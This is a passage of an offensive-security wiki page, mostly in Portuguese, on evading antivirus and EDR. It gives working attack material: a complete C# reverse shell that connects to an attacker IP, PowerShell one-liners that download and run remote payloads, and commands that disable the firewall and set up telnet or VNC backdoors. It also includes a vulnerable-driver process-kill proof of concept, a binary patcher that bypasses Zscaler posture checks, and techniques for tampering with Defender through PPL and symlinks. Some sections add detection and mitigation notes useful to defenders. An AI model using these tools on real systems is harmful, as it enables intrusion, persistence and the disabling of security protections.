A maioria dos C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já fornecem a capacidade de executar assemblies C# diretamente em memória, mas existem diferentes formas de fazer isso:

- **Fork\&Run**

Envolve **criar um novo processo sacrificial**, injetar seu código malicioso de post-exploitation nesse novo processo, executar o código malicioso e, quando terminar, matar o processo novo. Isso tem tanto benefícios quanto desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do nosso processo Beacon implantado. Isso significa que se algo na nossa ação de post-exploitation der errado ou for detectado, há uma **chance muito maior** de nosso **implant sobreviver.** A desvantagem é que há uma **maior chance** de ser pego por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de post-exploitation **no próprio processo**. Dessa forma, você pode evitar criar um novo processo e que ele seja escaneado pelo AV, mas a desvantagem é que se algo der errado na execução do seu payload, há uma **chance muito maior** de **perder seu beacon** já que ele pode travar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar C# Assemblies **from PowerShell**, veja [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e o vídeo do S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Usando Outras Linguagens de Programação

Como proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens dando à máquina comprometida acesso **ao ambiente do interpretador instalado no Attacker Controlled SMB share**.

Ao permitir acesso aos Interpreter Binaries e ao ambiente na SMB share você pode **executar código arbitrário nessas linguagens na memória** da máquina comprometida.

O repositório indica: Defender ainda escaneia os scripts, mas ao utilizar Go, Java, PHP etc temos **mais flexibilidade para bypassar assinaturas estáticas**. Testes com shells reversas aleatórias não ofuscadas nessas linguagens mostraram-se bem sucedidos.

## TokenStomping

Token stomping é uma técnica que permite ao atacante **manipular o access token ou um produto de segurança como um EDR ou AV**, permitindo reduzir seus privilégios para que o processo não morra, mas que não tenha permissões para verificar atividades maliciosas.

Para evitar isso, o Windows poderia **impedir que processos externos** obtenham handles sobre os tokens de processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como descrito em [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil apenas implantar o Chrome Remote Desktop no PC da vítima e então usá-lo para takeover e manter persistência:
1. Download from https://remotedesktop.google.com/, clique em "Set up via SSH", e então clique no arquivo MSI para Windows para baixar o MSI.
2. Execute o instalador silenciosamente na vítima (admin requerido): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte para a página do Chrome Remote Desktop e clique em next. O assistente então pedirá autorização; clique no botão Authorize para continuar.
4. Execute o parâmetro dado com alguns ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note o parâmetro pin que permite definir o PIN sem usar a GUI).


## Evasão Avançada

Evasão é um tópico muito complicado, às vezes você tem que levar em conta muitas fontes diferentes de telemetria em um único sistema, então é praticamente impossível permanecer completamente indetectável em ambientes maduros.

Cada ambiente contra o qual você atuar terá suas próprias forças e fraquezas.

Recomendo fortemente que você assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94), para obter uma introdução a técnicas mais avançadas de Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta é também outra excelente palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Técnicas Antigas**

### **Verifique quais partes o Defender considera maliciosas**

Você pode usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que irá **remover partes do binário** até descobrir **qual parte o Defender** está encontrando como maliciosa e te retornar essa informação.\
Outra ferramenta que faz a **mesma coisa é** [**avred**](https://github.com/dobin/avred) com um serviço web aberto em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Servidor Telnet**

Até o Windows10, todas as versões do Windows vinham com um **Telnet server** que você podia instalar (como administrador) fazendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute**-o agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar telnet port** (stealth) e desativar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Faça o download em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os binários, não o instalador)

**ON THE HOST**: Execute _**winvnc.exe**_ e configure o servidor:

- Habilite a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **recém-criado** _**UltraVNC.ini**_ para dentro da **victim**

#### **Reverse connection**

O **attacker** deve executar no seu **host** o binário `vncviewer.exe -listen 5900` para que ele fique **preparado** para capturar uma reverse **VNC connection**. Então, dentro da **victim**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para manter a furtividade você não deve fazer algumas coisas

- Não inicie `winvnc` se ele já estiver em execução ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se está em execução com `tasklist | findstr winvnc`
- Não inicie `winvnc` sem `UltraVNC.ini` no mesmo diretório ou isso fará com que [a janela de configuração](https://i.imgur.com/rfMQWcf.png) seja aberta
- Não execute `winvnc -h` para ajuda ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Faça o download em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **xml payload** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O defender atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro C# Revershell

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando o compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscadores para C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para construir exemplos de injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 leveraged a tiny console utility known as **Antivirus Terminator** to disable endpoint protections before dropping ransomware. The tool brings its **own vulnerable but *signed* driver** and abuses it to issue privileged kernel operations that even Protected-Process-Light (PPL) AV services cannot block.

Principais pontos
1. **Signed driver**: O arquivo entregue em disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys` do “System In-Depth Analysis Toolkit” da Antiy Labs. Porque o driver possui uma assinatura Microsoft válida, ele é carregado mesmo quando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **serviço kernel** e a segunda o inicia para que `\\.\ServiceMouse` se torne acessível a partir do user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capacidade                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar um processo arbitrário por PID (usado para matar serviços Defender/EDR) |
| `0x990000D0` | Apagar um arquivo arbitrário no disco |
| `0x990001D0` | Descarregar o driver e remover o serviço |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD ignora completamente as proteções em user-mode; código que executa no kernel pode abrir processos *protegidos*, terminá-los ou manipular objetos do kernel independentemente de PPL/PP, ELAM ou outras funcionalidades de hardening.

Detecção / Mitigação
•  Habilitar a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows recuse carregar `AToolsKrnl64.sys`.
•  Monitorar a criação de novos serviços *kernel* e alertar quando um driver é carregado a partir de um diretório gravável por todos os usuários ou não está presente na lista de permitidos.
•  Observar handles em user-mode para objetos de dispositivo customizados seguidos por chamadas suspeitas `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applies device-posture rules locally and relies on Windows RPC to communicate the results to other components. Two weak design choices make a full bypass possible:

1. Posture evaluation happens **entirely client-side** (a boolean is sent to the server).
2. Internal RPC endpoints only validate that the connecting executable is **signed by Zscaler** (via `WinVerifyTrust`).

By **patching four signed binaries on disk** both mechanisms can be neutralised:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1` para que toda verificação seja conforme |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ qualquer processo (mesmo não assinado) pode ligar-se aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituída por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Atalho/curto-circuito aplicado |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Todas** as checagens de postura exibem **green/compliant**.
* Binários não assinados ou modificados podem abrir os named-pipe RPC endpoints (p.ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido ganha acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e verificações simples de assinatura podem ser derrotadas com algumas modificações de poucos bytes.

## Abusar de Protected Process Light (PPL) para adulterar AV/EDR com LOLBINs

Protected Process Light (PPL) impõe uma signer/level hierarchy de modo que apenas processos protegidos de nível igual ou superior possam adulterar uns aos outros. No contexto ofensivo, se você consegue legítimamente iniciar um binário com PPL habilitado e controlar seus argumentos, pode converter funcionalidades benignas (p.ex., logging) em uma primitiva de escrita restrita, respaldada por PPL, contra diretórios protegidos usados por AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitiva LOLBIN: ClipUp.exe
- O binário do sistema assinado `C:\Windows\System32\ClipUp.exe` auto-inicia e aceita um parâmetro para gravar um arquivo de log em um caminho especificado pelo chamador.
- Quando iniciado como um processo PPL, a gravação do arquivo ocorre sob proteção PPL.
- ClipUp não consegue analisar caminhos com espaços; use caminhos curtos 8.3 para apontar para locais normalmente protegidos.

8.3 short path helpers
- Liste nomes curtos: `dir /x` em cada diretório pai.
- Obtenha o caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicie a LOLBIN compatível com PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (por exemplo, CreateProcessAsPPL).
2) Passe o argumento de caminho de log do ClipUp para forçar a criação de um arquivo em um diretório AV protegido (por exemplo, Defender Platform). Use nomes curtos 8.3 se necessário.
3) Se o binário alvo normalmente estiver aberto/bloqueado pelo AV enquanto executa (por exemplo, MsMpEng.exe), agende a gravação na inicialização antes do AV iniciar instalando um serviço de inicialização automática que seja executado mais cedo de forma confiável. Valide a ordem de boot com Process Monitor (boot logging).
4) No reboot, a gravação com suporte PPL ocorre antes do AV bloquear seus binários, corrompendo o arquivo alvo e impedindo a inicialização.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas e restrições
- Você não pode controlar o conteúdo que o ClipUp escreve além da colocação; a primitiva é adequada para corrupção em vez de injeção precisa de conteúdo.
- Requer Administrator/SYSTEM local para instalar/iniciar um serviço e uma janela de reboot.
- O timing é crítico: o alvo não deve estar aberto; execução em boot evita locks de arquivo.

Detecções
- Criação de processo de `ClipUp.exe` com argumentos incomuns, especialmente quando parentado por launchers não padrão, durante a inicialização.
- Novos serviços configurados para auto-start de binaries suspeitos que consistentemente iniciam antes do Defender/AV. Investigar criação/modificação de serviços antes de falhas de startup do Defender.
- Monitoramento de integridade de arquivos em binaries/Platform do Defender; criações/modificações inesperadas de arquivos por processos com flags de protected-process.
- Telemetria ETW/EDR: procurar processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de nível PPL por binaries não-AV.

Mitigações
- WDAC/Code Integrity: restringir quais signed binaries podem rodar como PPL e sob quais parents; bloquear invocação do ClipUp fora de contextos legítimos.
- Higiene de serviços: restringir criação/modificação de serviços auto-start e monitorar manipulação da ordem de start.
- Garantir que tamper protection do Defender e proteções de early-launch estejam habilitadas; investigar erros de startup indicando corrupção de binaries.
- Considerar desabilitar a geração de nomes curtos 8.3 em volumes que hospedam ferramentas de segurança se compatível com seu ambiente (testar exaustivamente).

Referências para PPL e ferramentas
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender escolhe a platform de onde roda enumerando subpastas em:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona a subpasta com a maior string de versão lexicográfica (por exemplo, `4.18.25070.5-0`), então inicia os processos do serviço Defender a partir dali (atualizando caminhos de serviço/registro conforme). Essa seleção confia em entradas de diretório incluindo directory reparse points (symlinks). Um administrador pode aproveitar isso para redirecionar o Defender para um caminho gravável por atacante e conseguir DLL sideloading ou interrupção de serviço.

Pré-requisitos
- Administrador local (necessário para criar diretórios/symlinks sob a pasta Platform)
- Capacidade de rebootar ou forçar re-seleção da platform do Defender (restart do serviço no boot)
- Apenas ferramentas built-in necessárias (mklink)

Por que funciona
- O Defender bloqueia gravações em suas próprias pastas, mas sua seleção de platform confia em entradas de diretório e escolhe a versão lexicograficamente maior sem validar se o destino resolve para um caminho protegido/confiável.

Passo a passo (exemplo)
1) Prepare um clone gravável da pasta Platform atual, por exemplo `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório com versão superior dentro de Platform apontando para a sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Seleção de trigger (reboot recommended):
```cmd
shutdown /r /t 0
```
4) Verifique se MsMpEng.exe (WinDefend) está sendo executado a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Você deve observar o novo caminho do processo em `C:\TMP\AV\` e a configuração/registro do serviço refletindo essa localização.

Opções pós-exploração
- DLL sideloading/code execution: Coloque/substitua DLLs que o Defender carrega do seu diretório de aplicação para executar código nos processos do Defender. Veja a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remova o version-symlink para que, na próxima inicialização, o caminho configurado não seja resolvido e o Defender falhe ao iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Observe que esta técnica não fornece escalonamento de privilégios por si só; requer privilégios de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams podem mover a evasão em tempo de execução para fora do implant C2 e para dentro do módulo alvo, interceptando sua Import Address Table (IAT) e roteando APIs selecionadas através de código independente de posição controlado pelo atacante (PIC). Isso generaliza a evasão além da pequena superfície de API que muitos kits expõem (por exemplo, CreateProcessA), e estende as mesmas proteções para BOFs e DLLs de pós‑exploração.

Abordagem de alto nível
- Disponibilizar um blob PIC ao lado do módulo alvo usando um reflective loader (prepended ou companion). O PIC deve ser autocontido e independente de posição.
- À medida que a DLL host carrega, percorra seu IMAGE_IMPORT_DESCRIPTOR e aplique patches nas entradas da IAT para as importações alvo (por exemplo, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para apontar para pequenos wrappers PIC.
- Cada wrapper PIC executa evasões antes de fazer tail‑call para o endereço da API real. Evasões típicas incluem:
  - Mascarar/desmascarar memória em torno da chamada (por exemplo, criptografar regiões do beacon, RWX→RX, alterar nomes/permissões de páginas) e depois restaurar pós‑chamada.
  - Call‑stack spoofing: construir uma pilha benigna e transitar para a API alvo para que a análise de call‑stack resolva para frames esperados.
- Para compatibilidade, exportar uma interface para que um script Aggressor (ou equivalente) possa registrar quais APIs interceptar para Beacon, BOFs e DLLs de pós‑ex.

Why IAT hooking here
- Funciona para qualquer código que use a importação hookada, sem modificar o código da ferramenta ou depender do Beacon para proxy de APIs específicas.
- Cobre DLLs de pós‑ex: hookar LoadLibrary* permite interceptar carregamentos de módulos (por exemplo, System.Management.Automation.dll, clr.dll) e aplicar o mesmo mascaramento/evasão de pilha às suas chamadas de API.
- Restaura o uso confiável de comandos de pós‑ex que geram processos contra detecções baseadas em call‑stack ao envolver CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Aplique o patch após relocations/ASLR e antes do primeiro uso da importação. Reflective loaders like TitanLdr/AceLdr demonstrate hooking durante DllMain do módulo carregado.
- Mantenha os wrappers pequenos e PIC-safe; resolva a API verdadeira via o valor original da IAT que você capturou antes do patch ou via LdrGetProcedureAddress.
- Use transições RW → RX para PIC e evite deixar páginas writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs constroem uma cadeia de chamadas falsa (endereços de retorno apontando para módulos benignos) e então pivotam para a API real.
- Isso derrota detecções que esperam pilhas canônicas de Beacon/BOFs para APIs sensíveis.
- Combine com técnicas de stack cutting/stack stitching para aterrissar dentro dos frames esperados antes do prologue da API.

Operational integration
- Prepend o reflective loader aos post‑ex DLLs para que o PIC e os hooks inicializem automaticamente quando a DLL for carregada.
- Use um Aggressor script para registrar APIs-alvo, assim Beacon e BOFs se beneficiam transparentemente do mesmo caminho de evasion sem mudanças no código.

Detection/DFIR considerations
- IAT integrity: entradas que resolvem para endereços non‑image (heap/anon); verificação periódica dos ponteiros de import.
- Stack anomalies: endereços de retorno que não pertencem a imagens carregadas; transições abruptas para PIC non‑image; ancestralidade inconsistente de RtlUserThreadStart.
- Loader telemetry: escritas in‑process na IAT, atividade precoce em DllMain que modifica import thunks, regiões RX inesperadas criadas no carregamento.
- Image‑load evasion: se houver hooking de LoadLibrary*, monitore carregamentos suspeitos de automation/clr assemblies correlacionados com memory masking events.

Related building blocks and examples
- Reflective loaders que realizam IAT patching durante o load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) e stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustra como info‑stealers modernos combinam AV bypass, anti‑analysis e acesso a credenciais em um único fluxo de trabalho.

### Keyboard layout gating & sandbox delay

- Uma config flag (`anti_cis`) enumera os layouts de teclado instalados via `GetKeyboardLayoutList`. Se for encontrado um layout cirílico, o sample solta um marcador vazio `CIS` e termina antes de executar os stealers, garantindo que nunca detone em localidades excluídas enquanto deixa um artefato de hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica em camadas de `check_antivm`

- Variant A percorre a lista de processos, hash de cada nome com um checksum rolante personalizado, e compara contra blocklists embutidas para debuggers/sandboxes; repete o checksum sobre o nome do computador e verifica diretórios de trabalho como `C:\analysis`.
- Variant B inspeciona propriedades do sistema (limiar de contagem de processos, uptime recente), chama `OpenServiceA("VBoxGuest")` para detectar adições do VirtualBox, e realiza checagens de tempo em torno de sleeps para identificar single-stepping. Qualquer detecção aborta antes do lançamento dos módulos.

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
